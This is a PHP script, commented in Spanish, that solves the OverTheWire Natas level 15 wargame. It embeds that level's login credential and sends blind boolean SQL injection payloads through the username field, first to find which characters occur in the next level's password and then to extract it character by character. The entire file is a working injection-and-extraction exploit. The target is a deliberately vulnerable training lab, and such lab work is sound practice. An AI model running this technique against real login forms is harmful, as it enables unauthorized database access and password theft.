<?php

# Variables globales
$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$longitud_caracteres = strlen($caracteres);

$filtrados = "";
$contrasena_final = "";

# Conectarse a natas15 usando la biblioteca PHP curl
$conexion = curl_init();

# Definir parámetros de conexión
$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$usuario = "natas15";
$contrasena = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB";

# Bucle de caracteres
for ($i = 0; $i < $longitud_caracteres; $i++) {

    # Establecer la conexión a natas15
    curl_setopt_array($conexion,
        array(
            CURLOPT_URL               => $url,
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$usuario:$contrasena",
            CURLOPT_RETURNTRANSFER    => true,
            CURLOPT_POST              => 1,
            CURLOPT_POSTFIELDS        => http_build_query(array('username' => 'natas16" and password LIKE BINARY "%' . $caracteres[$i] . '%" #'))
        )
    );

    # Ejecutar la petición
    $respuesta_servidor = curl_exec($conexion);

    # Si el carácter está en la cadena de la contraseña ...
    if (stripos($respuesta_servidor, "exists") !== false) {
        $filtrados = $filtrados . $caracteres[$i];
    }

}

# Mostrar caracteres filtrados
echo "Caracteres filtrados: ". $filtrados . "\n";

# Fuerza bruta para obtener la contraseña
echo "Generando la contraseña \n";
$longitud_filtrados = strlen($filtrados);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $longitud_filtrados; $j++) {

        # Establecer la conexión a natas15
        curl_setopt_array($conexion,
            array(
                CURLOPT_URL               => $url,
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$usuario:$contrasena",
                CURLOPT_RETURNTRANSFER    => true,
                CURLOPT_POST              => 1,
                CURLOPT_POSTFIELDS        => http_build_query(array('username' => 'natas16" and password LIKE BINARY "' . $contrasena_final . $filtrados[$j] . '%" #'))
            )
        );

        # Ejecutar la petición
        $respuesta_servidor = curl_exec($conexion);

        # Si el carácter está en la cadena de la contraseña ...
        if (stripos($respuesta_servidor, "exists") !== false) {
            $contrasena_final = $contrasena_final . $filtrados[$j];
            echo $contrasena_final . "\n";
            break;
        }

    }
}

echo "Contraseña: " . $contrasena_final . "\n";

# Cerrar conexión
curl_close($conexion);
